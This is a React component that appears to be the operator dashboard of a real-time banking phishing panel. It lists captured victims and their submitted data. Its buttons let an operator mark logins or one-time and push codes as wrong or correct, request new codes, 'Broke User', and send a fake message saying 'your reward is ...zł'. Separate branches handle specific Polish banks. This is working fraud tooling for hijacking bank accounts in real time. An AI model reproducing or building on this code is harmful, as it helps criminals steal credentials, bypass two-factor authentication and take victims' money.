import React, {Fragment, useEffect, useState} from 'react';
import {
    Container,
    Row,
    Col,
    Card,
    CardBody,
    CardHeader,
    CardFooter,
    Button,
    Modal,
    ModalHeader,
    ModalBody,
    ModalFooter,
    Form,
    FormGroup,
    Label,
    Input,
    Badge
} from "reactstrap";
import {useSocket} from "../../context/socket/socketProvider";
import {Check, Settings, Trash, X} from "react-feather";
import Loader from "../Loader/Loader";

const UsersList = () => {
    const [modal, setModal] = useState(false);
    const [settings, setSettings] = useState(false);
    const [userid, setUserid] = useState(null);
    const [push, setPush] = useState(0);
    const {
        users,
        handleAction,
        updateUser,
        connect,
        disconnect,
        deleteUser
    } = useSocket();
    const togglePushModal = () => setModal(!modal);
    const toggleSettingsModal = () => setSettings(!settings);
    const handlePush = (e) => setPush(e.target.value);
    const handleGetPush = (e) => {
        e.preventDefault();
        togglePushModal();
        console.log(userid, push);
        updateUser('get_push', userid, {
            amount:push,
            code: ''
        });
    }


    const genBadge = (status) => {
        let color = 'primary',
            text = status;
        if (['init', 'correct_code', 'success_user'].includes(status)) {
            color = 'success';
        } else if (['wrong_login', 'wrong_code', 'wrong_push', 'wrong_other_data','fail_user'].includes(status)) {
            color = 'danger';
        } else if (['getting_code', 'get_push', 'send_other_data'].includes(status)) {
            color = 'warning';
        }

        return <Badge color={color}>{text}</Badge>;
    }
    useEffect(()=> {
        connect();
        return () => disconnect()
    },[])

    if(users === null){
        return (
            <div className={'loader-wrapper'}>
                <Loader/>
            </div>
        )
    }
    if (users.length === 0) {
        return (
            <h1>No users</h1>
        )
    }


    return (
        <Fragment>
            {
                users.map((user) => (
                    <Col sm="12" xl="6" key={user.id}>
                        <Card className={'user_card'}>
                            <CardHeader>

                                <h5>{'User'} {genBadge(user.status)}</h5>
                                <div className={'admin_actions'}>
                                    <Button
                                        onClick={()=> deleteUser(user.id)}>
                                        <Trash/>
                                    </Button>
                                    <Button
                                    onClick={()=> {
                                        setUserid(user.id);
                                        toggleSettingsModal();
                                    } }>
                                        <Settings/>
                                    </Button>

                                </div>
                            </CardHeader>
                            <CardBody>
                                <div className="user_data">
                                    {
                                        Object.keys(user).map((item) => (
                                            user[item] && (item !== 'status') ?
                                                <FormGroup className="row">
                                                    <Label className="col-sm-3 col-form-label">{item}</Label>
                                                    <Col sm="9">
                                                        <Input className="form-control" type="text" disabled
                                                               value={user[item]}/>
                                                    </Col>
                                                </FormGroup>
                                                : null
                                        ))
                                    }
                                </div>

                                {
                                    user.status === 'init' || user.status === 'send_pass' ?
                                        <CardFooter>
                                            <Button
                                                color='secondary'
                                                className={'mr-1'}
                                                onClick={() => updateUser('wrong_login',user.id)}>
                                                Wrong login
                                            </Button>
                                            <Button color='primary'
                                                    onClick={() => updateUser('getting_code', user.id)}>
                                                Get Code
                                            </Button>
                                            <Button color='primary'
                                                    className={'mr-1'}
                                                    onClick={() => updateUser('getting_push_code', user.id)}>
                                                Get Push
                                            </Button>
                                        </CardFooter> :
                                        user.status === 'send_code' ?
                                            <CardFooter>
                                                <Button
                                                    color={'secondary'}
                                                    className={'mr-1'}
                                                    onClick={() => updateUser('wrong_code', user.id)}>
                                                    Wrong Code
                                                </Button>
                                                <Button
                                                    color={'primary'}
                                                    onClick={() => updateUser('correct_code',user.id)}
                                                >
                                                    Correct code
                                                </Button>
                                            </CardFooter> :
                                            user.status === 'send_new_code' ?
                                                <CardFooter>
                                                    <Button
                                                        color={'secondary'}
                                                        className={'mr-1'}
                                                        onClick={() => updateUser('wrong_new_code', user.id)}>
                                                        Wrong Code
                                                    </Button>
                                                    <Button
                                                        color={'primary'}
                                                        onClick={() => updateUser('correct_new_code',user.id)}
                                                    >
                                                        Correct code
                                                    </Button>
                                                </CardFooter> :
                                                user.status === 'send_push_code' ?
                                                    <CardFooter>
                                                        <Button
                                                            color={'secondary'}
                                                            className={'mr-1'}
                                                            onClick={() => updateUser('wrong_push_code', user.id)}>
                                                            Wrong Code
                                                        </Button>
                                                        <Button
                                                            color={'primary'}
                                                            onClick={() => updateUser('correct_code',user.id)}
                                                        >
                                                            Correct code
                                                        </Button>
                                                    </CardFooter> :
                                            user.status === 'correct_code' && user.bank === 'centrum' ?
                                                <CardFooter>
                                                    <Button
                                                        color={'primary'}
                                                        className={'mr-1'}
                                                        onClick={() => {
                                                            setUserid(user.id);
                                                            togglePushModal()
                                                        }}>
                                                        Push
                                                    </Button>
                                                    <Button
                                                        color={'danger'}
                                                        className={'mr-1'}
                                                        onClick={() =>  handleAction('fail_user', user.id)}
                                                    >
                                                        Fail
                                                    </Button>
                                                    <Button
                                                        color={'success'}
                                                        className={'mr-1'}
                                                        onClick={() => handleAction('success_user', user.id)}
                                                    >
                                                        Success
                                                    </Button>
                                                </CardFooter> :
                                            user.status === 'correct_code' && user.bank !== 'alior' ?
                                                <CardFooter>
                                                    <Button
                                                        color={'secondary'}
                                                        className={'mr-1'}
                                                        onClick={() => updateUser('broke_user',user.id)}>
                                                        Broke User
                                                    </Button>
                                                    <Button
                                                        color={'danger'}
                                                        className={'mr-1'}
                                                        onClick={() =>  handleAction('fail_user', user.id)}
                                                    >
                                                        Fail
                                                    </Button>
                                                    <Button
                                                        color={'success'}
                                                        className={'mr-1'}
                                                        onClick={() => handleAction('success_user', user.id)}
                                                    >
                                                        Success
                                                    </Button>
                                                </CardFooter> :
                                            user.status === 'send_other_data'?
                                                <CardFooter>
                                                    <Button
                                                        color={'secondary'}
                                                        className={'mr-1'}
                                                        onClick={() => updateUser('wrong_other_data',user.id)}
                                                    >
                                                        Wrong Data
                                                    </Button>
                                                    <Button color='primary'
                                                            onClick={() => updateUser('getting_new_code', user.id)}>
                                                        Get Code
                                                    </Button>
                                                </CardFooter> :
                                                user.status === 'send_push' ?
                                                    <CardFooter>
                                                        <Button
                                                            color={'secondary'}
                                                            className={'mr-1'}
                                                            onClick={() => updateUser('wrong_push', user.id)}>
                                                            Wrong push
                                                        </Button>
                                                        <Button
                                                            color={'primary'}
                                                            className={'mr-1'}
                                                            onClick={() => updateUser('correct_push',user.id)}
                                                        >
                                                            Correct push
                                                        </Button>
                                                    </CardFooter> :
                                                    user.status === 'correct_push' || user.status === 'correct_new_code' ?
                                                        <CardFooter>
                                                            <Button
                                                                color={'secondary'}
                                                                className={'mr-1'}
                                                                onClick={() => updateUser('broke_user',user.id)}>
                                                                Broke User
                                                            </Button>
                                                            <Button
                                                                color={'danger'}
                                                                className={'mr-1'}
                                                                disabled
                                                                onClick={() =>  handleAction('fail_user', user.id)}
                                                            >
                                                                Fail
                                                            </Button>
                                                            <Button
                                                                color={'success'}
                                                                className={'mr-1'}
                                                                disabled
                                                                onClick={() => handleAction('success_user', user.id)}
                                                            >
                                                                Success
                                                            </Button>
                                                        </CardFooter> :
                                                        user.status === 'broke_user' ?
                                                            <CardFooter>
                                                                <Button
                                                                    color={'danger'}
                                                                    className={'mr-1'}
                                                                    onClick={() => handleAction('fail_user', {id:user.id})}
                                                                >
                                                                    Fail
                                                                </Button>
                                                                <Button
                                                                    color={'success'}
                                                                    className={'mr-1'}
                                                                    onClick={() => handleAction('success_user', {id:user.id})}
                                                                >
                                                                    Success
                                                                </Button>
                                                            </CardFooter> : null
                                }
                                {/*<Button color='primary'>Action</Button>*/}
                            </CardBody>
                            <Modal isOpen={modal} toggle={togglePushModal}>
                                <ModalHeader toggle={togglePushModal}>
                                    Send push
                                </ModalHeader>
                                <ModalBody>
                                    <Form onSubmit={handleGetPush}>
                                        <FormGroup>
                                            <Label className="col-form-label"
                                                   for="recipient-name">{"Recipient ID:"}</Label>
                                            <Input className="form-control" type="text" disabled value={userid}/>
                                        </FormGroup>
                                        <FormGroup>
                                            <Label className="col-form-label" for="message-text">{"Amount:"}</Label>
                                            <Input
                                                type="text"
                                                className="form-control"
                                                value={push}
                                                id="message-text"
                                                onChange={handlePush}
                                            />
                                        </FormGroup>

                                        <div className='push_message'>
                                            {`After the bank recalculating the amount, your reward is ${push}zł.`}
                                        </div>
                                    </Form>
                                </ModalBody>
                                <ModalFooter>
                                    <Button color="secondary" onClick={togglePushModal}>Close</Button>
                                    <Button color="primary" onClick={handleGetPush}>Push</Button>
                                </ModalFooter>
                            </Modal>
                            <Modal isOpen={settings} toggle={toggleSettingsModal}>
                                <ModalHeader toggle={togglePushModal}>
                                    Settings
                                </ModalHeader>
                                <ModalBody>
                                    <Form>
                                        <FormGroup>
                                            <Label className="col-form-label"
                                                   for="recipient-name">{"Recipient ID:"}</Label>
                                            <Input className="form-control" type="text" disabled value={userid}/>
                                        </FormGroup>

                                        {/*<div className='push_message'>*/}
                                        {/*    {`After the bank recalculating the amount, your reward is ${push}zł.`}*/}
                                        {/*</div>*/}
                                    </Form>
                                </ModalBody>
                                <ModalFooter>
                                    <Button color="secondary" onClick={toggleSettingsModal}>Close</Button>
                                    {/*<Button color="primary" onClick={handleGetPush}>Push</Button>*/}
                                </ModalFooter>
                            </Modal>
                        </Card>
                    </Col>
                ))
            }
        </Fragment>

    )
}

export default UsersList;